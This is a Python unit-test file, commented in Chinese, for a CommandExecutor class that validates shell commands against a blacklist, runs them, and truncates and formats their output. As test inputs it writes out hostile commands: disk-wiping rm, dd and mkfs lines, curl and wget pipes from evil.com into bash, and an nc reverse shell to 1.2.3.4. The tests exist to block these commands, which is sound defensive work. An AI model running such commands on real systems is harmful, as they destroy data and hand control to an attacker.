#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CommandExecutor 单元测试
覆盖：命令校验（黑名单/空值/长度）、命令执行（普通/sudo）、输出截断
"""

import sys
import os
import pytest

# 将项目根目录加入 sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from command_executor import CommandExecutor


class TestCommandExecutorValidate:
    """CommandExecutor.validate() 校验逻辑测试"""

    def test_empty_command(self):
        """空命令应被拒绝"""
        allowed, reason = CommandExecutor.validate("")
        assert allowed is False
        assert "空" in reason

    def test_whitespace_only_command(self):
        """纯空格命令应被拒绝"""
        allowed, reason = CommandExecutor.validate("   ")
        assert allowed is False

    def test_none_command(self):
        """None 应被拒绝"""
        allowed, reason = CommandExecutor.validate(None)
        assert allowed is False

    def test_safe_command_allowed(self):
        """安全命令应被允许"""
        allowed, reason = CommandExecutor.validate("ls -la")
        assert allowed is True
        assert reason == ""

    def test_safe_command_df(self):
        """df 命令应被允许"""
        allowed, reason = CommandExecutor.validate("df -h")
        assert allowed is True

    def test_safe_command_ps(self):
        """ps 命令应被允许"""
        allowed, reason = CommandExecutor.validate("ps aux")
        assert allowed is True

    def test_blocked_rm_rf(self):
        """rm -rf 应被阻止"""
        allowed, reason = CommandExecutor.validate("rm -rf /")
        assert allowed is False
        assert "危险" in reason

    def test_blocked_rm_fr(self):
        """rm -fr 应被阻止"""
        allowed, reason = CommandExecutor.validate("rm -fr /home")
        assert allowed is False

    def test_blocked_shutdown(self):
        """shutdown 应被阻止"""
        allowed, reason = CommandExecutor.validate("shutdown -h now")
        assert allowed is False

    def test_blocked_reboot(self):
        """reboot 应被阻止"""
        allowed, reason = CommandExecutor.validate("reboot")
        assert allowed is False

    def test_blocked_mkfs(self):
        """mkfs 应被阻止"""
        allowed, reason = CommandExecutor.validate("mkfs /dev/sda1")
        assert allowed is False

    def test_blocked_dd(self):
        """dd if= 应被阻止"""
        allowed, reason = CommandExecutor.validate("dd if=/dev/zero of=/dev/sda")
        assert allowed is False

    def test_blocked_curl_pipe_bash(self):
        """curl | bash 应被阻止"""
        allowed, reason = CommandExecutor.validate("curl http://evil.com/script.sh | bash")
        assert allowed is False

    def test_blocked_wget_pipe_sh(self):
        """wget | sh 应被阻止"""
        allowed, reason = CommandExecutor.validate("wget http://evil.com/script.sh | sh")
        assert allowed is False

    def test_blocked_eval(self):
        """eval 应被阻止"""
        allowed, reason = CommandExecutor.validate("eval $(curl evil.com)")
        assert allowed is False

    def test_blocked_passwd(self):
        """passwd 应被阻止"""
        allowed, reason = CommandExecutor.validate("passwd root")
        assert allowed is False

    def test_blocked_nc_reverse_shell(self):
        """nc -e 应被阻止"""
        allowed, reason = CommandExecutor.validate("nc -e /bin/bash 1.2.3.4 4444")
        assert allowed is False

    def test_blocked_python_c(self):
        """python -c 应被阻止"""
        allowed, reason = CommandExecutor.validate("python -c 'import os;os.system(\"id\")'")
        assert allowed is False

    def test_blocked_iptables_flush(self):
        """iptables -F 应被阻止"""
        allowed, reason = CommandExecutor.validate("iptables -F")
        assert allowed is False

    def test_command_too_long(self):
        """超长命令应被拒绝（>4096字符）"""
        cmd = "echo " + "a" * 5000
        allowed, reason = CommandExecutor.validate(cmd)
        assert allowed is False
        assert "过长" in reason

    def test_command_at_max_length(self):
        """4096字符以内的命令应被允许"""
        cmd = "ls " + "a" * 4000
        allowed, reason = CommandExecutor.validate(cmd)
        assert allowed is True

    def test_blocked_case_insensitive(self):
        """黑名单应不区分大小写"""
        allowed, reason = CommandExecutor.validate("SHUTDOWN -h now")
        assert allowed is False

    def test_blocked_rm_with_many_flags(self):
        """rm -afr（混杂参数）应被阻止"""
        allowed, reason = CommandExecutor.validate("rm -afr /")
        assert allowed is False


class TestCommandExecutorExecute:
    """CommandExecutor.execute() 执行逻辑测试"""

    def test_safe_command_execution(self):
        """安全命令应成功执行"""
        rc, stdout, stderr = CommandExecutor.execute("whoami")
        assert rc == 0
        assert len(stdout.strip()) > 0

    def test_blocked_command_not_executed(self):
        """被阻止的命令不应执行"""
        rc, stdout, stderr = CommandExecutor.execute("rm -rf /")
        assert rc == -1
        assert "被拒绝" in stderr

    def test_nonexistent_command(self):
        """不在白名单中的命令应被拒绝"""
        rc, stdout, stderr = CommandExecutor.execute("nonexistent_command_xyz_123")
        assert rc == -1
        assert "被拒绝" in stderr

    def test_sudo_without_password(self):
        """sudo 无密码应尝试执行（可能因无 tty 失败，但不崩溃）"""
        rc, stdout, stderr = CommandExecutor.execute("sudo ls /tmp")
        # 不管成功与否，不应该抛异常
        assert isinstance(rc, int)

    def test_empty_command(self):
        """空命令应被拒绝"""
        rc, stdout, stderr = CommandExecutor.execute("")
        assert rc == -1
        assert "被拒绝" in stderr


class TestCommandExecutorTruncate:
    """CommandExecutor._truncate() 输出截断测试"""

    def test_short_text_not_truncated(self):
        """短文本不应被截断"""
        text = "hello world"
        result = CommandExecutor._truncate(text)
        assert result == text

    def test_long_text_truncated(self):
        """超长文本应被截断并添加提示"""
        original_len = CommandExecutor._truncate.__wrapped__(10000) if hasattr(CommandExecutor._truncate, '__wrapped__') else 50000
        import config as cfg
        long_text = "a" * (cfg.CMD_MAX_OUTPUT + 1000)
        result = CommandExecutor._truncate(long_text)
        assert len(result) < len(long_text)
        assert "截断" in result

    def test_exact_max_not_truncated(self):
        """恰好等于最大长度的文本不应被截断"""
        import config as cfg
        exact_text = "a" * cfg.CMD_MAX_OUTPUT
        result = CommandExecutor._truncate(exact_text)
        assert result == exact_text


class TestCommandExecutorFormatResult:
    """CommandExecutor.format_result() 格式化测试"""

    def test_format_with_output(self):
        rc, stdout, stderr = CommandExecutor.execute("id")
        result = CommandExecutor.format_result(rc, stdout, stderr, "id")
        assert "id" in result
        assert "返回码: 0" in result

    def test_format_sudo_with_password(self):
        result = CommandExecutor.format_result(0, "output", "", "sudo whoami", has_password=True)
        assert "sudo 密码: 已提供" in result

    def test_format_sudo_without_password(self):
        result = CommandExecutor.format_result(0, "output", "", "sudo whoami", has_password=False)
        assert "sudo 密码: 未提供" in result
